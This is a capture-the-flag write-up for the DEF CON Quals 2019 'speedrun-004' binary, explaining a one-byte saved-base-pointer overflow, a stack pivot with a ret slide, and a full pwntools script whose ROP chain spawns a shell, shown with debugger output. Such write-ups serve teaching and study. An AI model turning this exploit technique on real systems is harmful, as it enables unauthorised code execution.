# Defcon Quals 2019 Speedrun 4

Let's take a look at the binary:

```
$    file speedrun-004
speedrun-004: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=3633fdca0065d9365b3f0c0237c7785c2c7ead8f, stripped
$    pwn checksec speedrun-004
[*] '/Hackery/defcon/speedrun/s4/speedrun-004'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ ./speedrun-004
i think i'm getting better at this coding thing.
how much do you have to say?
15935728
That's too much to say!.
see ya later slowpoke.
```

So it is a `64` bit statically linked binary with `NX`. When we run it, it just prompts us for some input via stdin.

## Reversing

Reversing out the binary with Ghidra, we find this function:

```
undefined8
FUN_00400c46(undefined8 uParm1,undefined8 uParm2,undefined8 uParm3,undefined8 uParm4,
            undefined8 uParm5,undefined8 uParm6)

{
  long lVar1;
 
  FUN_00410e30(PTR_DAT_006b97a0,0,2,0,uParm5,uParm6,uParm2);
  lVar1 = FUN_0040e840("DEBUG");
  if (lVar1 == 0) {
    FUN_004498e0(5);
  }
  betterCoding();
  funStuff();
  slowpoke();
  return 0;
}
```

Realistically the part we care about here, is that the `funStuff` function is called. The `betterCoding` and `slowpoke` functions essentially just print text. Looking at the `funStuff` function, we see this:

```

void funStuff(void)

{
  undefined inputSize [9];
  undefined local_d;
  uint size;
 
  print("how much do you have to say?");
  fgets(0,inputSize,9);
  local_d = 0;
  size = atoi(inputSize);
  if ((int)size < 1) {
    print("That\'s not much to say.");
  }
  else {
    if ((int)size < 0x102) {
      scanInput((ulong)size);
    }
    else {
      print("That\'s too much to say!.");
    }
  }
  return;
}
```
In this function it prompts us for an integer, and if it is between 1-257, it will run the `scanInput` function with the integer we gave it as input. Also the `fgets`, `atoi`, and `print` functions I reversed them by just seeing their arguments and what they did (and named them accordingly), I didn't actually confirm that they were the actual functions correspond to. Looking at `scanInput`, we can see a bug.

```
void scanInput(int iParm1)

{
  undefined input [256];
 
  input[0] = 0;
  print("Ok, what do you have to say for yourself?");
  fgets(0,input,(long)iParm1);
  FUN_0040ffb0("Interesting thought \"%s\", I\'ll take it into consideration.\n",input);
  return;
}
```

Here we can see that it is calling `fgets` on the char array `input` which allows us to scan in `size` bytes (the integer we specified earlier). Since we can specify a size up to `0x101` bytes and it is a `0x100` byte space, we have a one byte overflow. Since there is no stack canary and nothing else between `input` and the stack frame, we will have a one byte overflow of the saved base pointer. We will be doing a stack pivot attack.

## Stack Pivot Exploit

Before we talk about this, let's talk about stack frames:

```
+------------+
| stack data |
|      v1    |
|      v2    |   
|    input   |
+------------+
|  base ptr  |
|  insr ptr  |
+------------+
```

The `stack data` represents the various variables that are kept on the stack (for `scanInput` it would be the `v1`, `v2`, and `input` variables). After that you have two saved values for the `base ptr` for the stack and `insr ptr` for the instructions. Thing is when a `call` instruction is made, these two values are placed in the call stack. That way when the function is done and it returns, it can take the saved base ptr and figure out where the stack is, and take the saved instruction pointer and figure out what code to execute.

The thing is, the saved instruction pointer is stored on top of the saved stack. We can see that here in gdb:

```
gef➤  info frame
Stack level 0, frame at 0x7ffe9fd84120:
 rip = 0x400baf; saved rip = 0x400c44
 called by frame at 0x7ffe9fd84140
 Arglist at 0x7ffe9fd83ff8, args:
 Locals at 0x7ffe9fd83ff8, Previous frame's sp is 0x7ffe9fd84120
 Saved registers:
  rbp at 0x7ffe9fd84110, rip at 0x7ffe9fd84118
gef➤  x/2g 0x7ffe9fd84110
0x7ffe9fd84110: 0x7ffe9fd84130  0x400c44
gef➤  x/2i 0x400c44
   0x400c44:  leave  
   0x400c45:  ret  
```

We can see that the saved base pointer is `0x7ffe9fd84110`, which immediately following that is `0x400c44` which is the return instruction. This will be executed as soon as the function returns. However we can see that what it does is runs the `leave` and `ret` instructions. When the second `ret` instruction is executed, it will execute the second qword value on the stack (since there have been no variables allocated on the stack, the first qword is the saved base pointer, and the second is the saved instruction pointer). Thus since we get to overwrite the least significant byte of the saved base pointer, we can decide what pointer gets executed with the second return. We can see that the second return happens right after `scanInput` gets called:

```
        00400c3f e8 2f ff        CALL       scanInput                                        undefined scanInput()
                 ff ff
                             LAB_00400c44                                    XREF[2]:     00400c21(j), 00400c38(j)  
        00400c44 c9              LEAVE
        00400c45 c3              RET
```

Now our input is directly above the base and instruction pointer. Depending on the iteration of the program (since the stack addresses are randomized every time the program runs), we can get the second return instruction to execute a rop chain of ours we inputted on the stack by overwriting the least significant byte with a particular value. Since we don't have an infoleak, I just went with `0x00` (a null byte). I append a ret slide (similar to a nop sled) to the front of the rop chain, that way if execution lands anywhere in there it will just execute return instructions until it starts executing our rop chain. Also when I say ret slide, I mean pointers to the ret instruction, not the ret instructions themselves. Of course doing it this way won't work 100% of the time, however I did get it to work somewhat frequently (like (1/3)-(1/2) of the time). For the ROP Chain it was a pretty standard one to make a syscall to execve, checkout this writeup for more details: https://github.com/guyinatuxedo/ctf/tree/master/defconquals2019/speedrun/s1 (or the static rop chain module)

Here is a quick look at how the memory gets corrupted:

```
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff383d4ba0│+0x0000: 0x0000000000000000   ← $rsp
0x00007fff383d4ba8│+0x0008: 0x0000010100000000
0x00007fff383d4bb0│+0x0010: 0x0000000000000000   ← $rax, $rsi
0x00007fff383d4bb8│+0x0018: 0x000000770000007c ("|"?)
0x00007fff383d4bc0│+0x0020: 0x0000005b0000006e ("n"?)
0x00007fff383d4bc8│+0x0028: 0x00007fff383d4b50  →  0x0000000000000029 (")"?)
0x00007fff383d4bd0│+0x0030: 0x0000000000000001
0x00007fff383d4bd8│+0x0038: 0x0000000000000140
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400ba0                  lea    rax, [rbp-0x100]
     0x400ba7                  mov    rsi, rax
     0x400baa                  mov    edi, 0x0
 →   0x400baf                  call   0x44a140
   ↳    0x44a140                  mov    eax, DWORD PTR [rip+0x2726c6]        # 0x6bc80c
        0x44a146                  test   eax, eax
        0x44a148                  jne    0x44a160
        0x44a14a                  xor    eax, eax
        0x44a14c                  syscall
        0x44a14e                  cmp    rax, 0xfffffffffffff000
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
0x44a140 (
   $rdi = 0x0000000000000000,
   $rsi = 0x00007fff383d4bb0 → 0x0000000000000000,
   $rdx = 0x0000000000000101
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "speedrun-004", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400baf → call 0x44a140
[#1] 0x400c44 → leave
[#2] 0x400ca2 → mov eax, 0x0
[#3] 0x401239 → mov edi, eax
[#4] 0x400a5a → hlt
─────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x0000000000400baf in ?? ()
gef➤  i f
Stack level 0, frame at 0x7fff383d4cc0:
 rip = 0x400baf; saved rip = 0x400c44
 called by frame at 0x7fff383d4ce0
 Arglist at 0x7fff383d4b98, args:
 Locals at 0x7fff383d4b98, Previous frame's sp is 0x7fff383d4cc0
 Saved registers:
  rbp at 0x7fff383d4cb0, rip at 0x7fff383d4cb8
gef➤  x/g 0x7fff383d4cb0
0x7fff383d4cb0: 0x7fff383d4cd0
```

We can see here before the `fgets` call that is made that the saved base pointer is `0x7fff383d4cd0`. After the `fgets` call, we can see that the saved base pointer is overwritten to `0x7fff383d4c000`:

```
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400ba7                  mov    rsi, rax
     0x400baa                  mov    edi, 0x0
     0x400baf                  call   0x44a140
 →   0x400bb4                  lea    rax, [rbp-0x100]
     0x400bbb                  mov    rsi, rax
     0x400bbe                  lea    rdi, [rip+0x91a9b]        # 0x492660
     0x400bc5                  mov    eax, 0x0
     0x400bca                  call   0x40ffb0
     0x400bcf                  nop    
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "speedrun-004", stopped, reason: TEMPORARY BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400bb4 → lea rax, [rbp-0x100]
[#1] 0x400c44 → leave
─────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400bb4 in ?? ()
gef➤  i f
Stack level 0, frame at 0x7fff383d4cc0:
 rip = 0x400bb4; saved rip = 0x400c44
 called by frame at 0x7fff383d4c10
 Arglist at 0x7fff383d4b98, args:
 Locals at 0x7fff383d4b98, Previous frame's sp is 0x7fff383d4cc0
 Saved registers:
  rbp at 0x7fff383d4cb0, rip at 0x7fff383d4cb8
gef➤  x/g 0x7fff383d4cb0
0x7fff383d4cb0: 0x7fff383d4c00
gef➤  x/2g 0x7fff383d4c00
0x7fff383d4c00: 0x400416  0x400416
gef➤  x/i 0x400416
   0x400416:  ret
gef➤  x/22g 0x7fff383d4c00
0x7fff383d4c00: 0x0000000000400416  0x0000000000400416
0x7fff383d4c10: 0x0000000000400416  0x0000000000400416
0x7fff383d4c20: 0x0000000000400416  0x0000000000400416
0x7fff383d4c30: 0x0000000000400416  0x0000000000400416
0x7fff383d4c40: 0x0000000000415f04  0x00000000006b6030
0x7fff383d4c50: 0x000000000044a155  0x0068732f6e69622f
0x7fff383d4c60: 0x000000000048d301  0x0000000000415f04
0x7fff383d4c70: 0x000000000000003b  0x0000000000400686
0x7fff383d4c80: 0x00000000006b6030  0x0000000000410a93
0x7fff383d4c90: 0x0000000000000000  0x000000000044a155
0x7fff383d4ca0: 0x0000000000000000  0x000000000040132c       
```

So we can see that the saved base pointer has been overwritten to `0x7fff383d4c00` which will cause the instruction address at `0x7fff383d4c08` to be executed with the second `ret`, which will be one of the gadgets for the ret slide. When it returns, we can see it starts off with the `leave/ret` instructions at `0x400c44`:

```
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400bca                  call   0x40ffb0
     0x400bcf                  nop    
     0x400bd0                  leave  
 →   0x400bd1                  ret    
   ↳    0x400c44                  leave  
        0x400c45                  ret    
        0x400c46                  push   rbp
        0x400c47                  mov    rbp, rsp
        0x400c4a                  sub    rsp, 0x10
        0x400c4e                  mov    DWORD PTR [rbp-0x4], edi
──────────────────────────────────────────────────────────────────────────────────────── threads ────
```

Procceding that we can see that the ret instructions that are part of our retslide that are executed:

```
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400c39                  or     cl, BYTE PTR [rbx-0x387603bb]
     0x400c3f                  call   0x400b73
     0x400c44                  leave  
 →   0x400c45                  ret    
   ↳    0x400416                  ret    
        0x400417                  add    bh, bh
        0x400419                  and    eax, 0x2b8bfa
        0x40041e                  xchg   ax, ax
        0x400420                  jmp    QWORD PTR [rip+0x2b8bfa]        # 0x6b9020
        0x400426                  xchg   ax, ax
──────────────────────────────────────────────────────────────────────────────────────── threads ────
```

After that we can see the beginning of our ROP chain is executed, which gives us code execution:


```
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
 →   0x415f04                  pop    rax
     0x415f05                  ret    
     0x415f06                  (bad)  
     0x415f07                  inc    DWORD PTR [rbx-0x6bf00008]
     0x415f0d                  rol    BYTE PTR [rax+rax*8-0x74b7458b], 0x53
     0x415f15                  sub    cl, ch
──────────────────────────────────────────────────────────────────────────────────────── threads ────
```

## Exploit

Putting it all together, we get the following exploit:
```
from pwn import *

target = process('./speedrun-004')
#gdb.attach(target, gdbscript = 'b *0x400baf')

# Establish rop gadgets
popRax = p64(0x415f04)
popRdi = p64(0x400686)
popRsi = p64(0x410a93)
popRdx = p64(0x44a155)

syscall = p64(0x40132c)

ret = p64(0x400416)

# 0x000000000048d301 : mov qword ptr [rax], rdx ; ret
mov = p64(0x48d301)

# bss adress we write to
bss = p64(0x6b6030)

binsh = p64(0x0068732f6e69622f)

# Our Rop chain
# Checkout https://github.com/guyinatuxedo/ctf/tree/master/defconquals2019/speedrun/s1
# for more details on how to make it
rop = ""
rop += popRax
rop += bss
rop += popRdx
rop += binsh
rop += mov

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += bss

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall

# Make the payload
# Append the rop chain to after the ret gadget slide
# Overwrite least significant byte of saved base pointer with 0x00
payload = ret*((256 - len(rop)) / 8) + rop + "\x00"

# Specify we are sending 257 bytes
target.sendline('257')

# Pause to ensure I/O purposes
raw_input()

# Send the payload
target.sendline(payload)

target.interactive()
```

After we run it a few times:
```
$ python exploit.py
[+] Starting local process './speedrun-004': pid 10089
w
[*] Switching to interactive mode
i think i'm getting better at this coding thing.
how much do you have to say?
Ok, what do you have to say for yourself?
Interesting thought "\x16\x04@", I'll take it into consideration.
$ w
 23:23:24 up  2:45,  1 user,  load average: 0.84, 0.83, 1.25
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               20:38   ?xdm?  10:57   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
$ ls
core  exploit.py  readme.md  speedrun-004
[*] Got EOF while reading in interactive
```

Just like that, we got a shell!